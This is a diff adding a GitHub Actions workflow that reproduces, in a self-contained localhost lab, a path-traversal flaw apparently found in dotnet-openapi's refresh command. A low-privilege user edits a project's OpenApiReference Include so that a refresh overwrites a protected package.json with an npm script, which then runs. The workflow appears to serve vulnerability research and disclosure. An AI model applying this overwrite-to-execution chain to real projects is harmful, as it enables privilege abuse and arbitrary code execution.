@@ -1,0 +1,103 @@
+name: F-039 OpenAPI successor lab
+on:
+  push:
+    branches:
+      - research/f039-successor-20261120-a1f8b0
+    paths:
+      - .github/workflows/f039-openapi-successor-20261120.yml
+
+permissions:
+  contents: read
+
+jobs:
+  successor:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - name: Set up pinned .NET SDK
+        uses: actions/setup-dotnet@v6
+        with:
+          dotnet-version: 10.0.x
+      - name: Exercise published CLI and protected successor
+        shell: bash
+        run: |
+          set -euo pipefail
+          export DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1
+          root="$(mktemp -d "$RUNNER_TEMP/f039-successor.XXXXXX")"
+          mkdir -p "$root/project" "$root/protected" "$root/source" "$root/tool"
+          chmod 755 "$root" "$root/source"
+          chmod 777 "$root/project"
+          chmod 700 "$root/protected"
+          project="$root/project/Lab.csproj"
+          protected="$root/protected/package.json"
+          marker="$root/protected/successor-marker.txt"
+          url='http://127.0.0.1:50139/spec.json'
+          other='http://127.0.0.1:50139/other.json'
+          original='{"name":"f039-protected","version":"1.0.0","scripts":{"postrefresh":"printf F039_ORIGINAL > successor-marker.txt"}}'
+          payload='{"openapi":"3.0.3","info":{"title":"F039 Synthetic","version":"1.0.0"},"paths":{},"name":"f039-synthetic","version":"1.0.0","scripts":{"postrefresh":"printf F039_SUCCESSOR_EXECUTED > successor-marker.txt"}}'
+          benign='<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><OpenApiReference Include="spec.json" SourceUrl="http://127.0.0.1:50139/spec.json" /></ItemGroup></Project>'
+          printf '%s' "$original" > "$protected"
+          printf '%s' "$payload" > "$root/source/spec.json"
+          printf '%s' "$benign" > "$project"
+          chmod 600 "$protected"
+          chmod 666 "$project"
+          python3 -m http.server 50139 --bind 127.0.0.1 --directory "$root/source" > "$root/http.log" 2>&1 &
+          http_pid=$!
+          trap 'kill "$http_pid" 2>/dev/null || true' EXIT
+          for attempt in $(seq 1 20); do
+            if curl -fsS "$url" -o "$root/fetched" 2>/dev/null; then break; fi
+            sleep 0.5
+          done
+          cmp "$root/source/spec.json" "$root/fetched"
+          echo "SDK=$(dotnet --version)"
+          dotnet tool install Microsoft.dotnet-openapi --version 10.0.15 --tool-path "$root/tool" --source https://api.nuget.org/v3/index.json
+          cd "$root/project"
+          "$root/tool/dotnet-openapi" refresh --updateProject "$project" "$url"
+          cmp "$root/source/spec.json" "$root/project/spec.json"
+          test "$(cat "$protected")" = "$original"
+          npm --prefix "$root/protected" run postrefresh
+          test "$(cat "$marker")" = F039_ORIGINAL
+          echo 'BENIGN=spec updated; protected package and original successor retained'
+          rm "$marker"
+          if "$root/tool/dotnet-openapi" refresh --updateProject "$project" "$other"; then
+            echo 'URL_MISMATCH=unexpectedly accepted'
+            exit 1
+          fi
+          test "$(cat "$protected")" = "$original"
+          echo 'URL_MISMATCH=denied; protected package retained'
+          sudo useradd --no-create-home --shell /bin/bash f039attacker
+          sudo -u f039attacker python3 - "$project" "$protected" "$root/project/attacker-result.txt" <<'PY'
+          from pathlib import Path
+          import os
+          import sys
+          project, protected, result = map(Path, sys.argv[1:])
+          text = project.read_text()
+          assert text.count('Include="spec.json"') == 1
+          project.write_text(text.replace('Include="spec.json"', 'Include="../protected/package.json"'))
+          try:
+              protected.write_text('F039_DIRECT_ATTACKER_WRITE')
+          except PermissionError:
+              result.write_text(f'UID={os.geteuid()};DIRECT_WRITE=denied')
+          else:
+              result.write_text(f'UID={os.geteuid()};DIRECT_WRITE=allowed')
+          PY
+          python3 - "$project" "$benign" <<'PY'
+          from pathlib import Path
+          import sys
+          assert Path(sys.argv[1]).read_text() == sys.argv[2].replace('Include="spec.json"', 'Include="../protected/package.json"')
+          PY
+          attacker_proof="$(cat "$root/project/attacker-result.txt")"
+          case "$attacker_proof" in *'DIRECT_WRITE=denied') ;; *) echo "ATTACKER_PROOF=$attacker_proof"; exit 1;; esac
+          test "$(cat "$protected")" = "$original"
+          echo "ATTACKER_PROOF=$attacker_proof; project Include only changed"
+          for round in 1 2; do
+            printf '%s' "$original" > "$protected"
+            chmod 600 "$protected"
+            rm -f "$marker"
+            "$root/tool/dotnet-openapi" refresh --updateProject "$project" "$url"
+            cmp "$root/source/spec.json" "$protected"
+            npm --prefix "$root/protected" run postrefresh
+            test "$(cat "$marker")" = F039_SUCCESSOR_EXECUTED
+            echo "ATTACK_ROUND_$round=protected package overwritten; successor executed"
+          done
+          echo 'F039_SUCCESSOR_RESULT=confirmed twice in constructed owned lab'
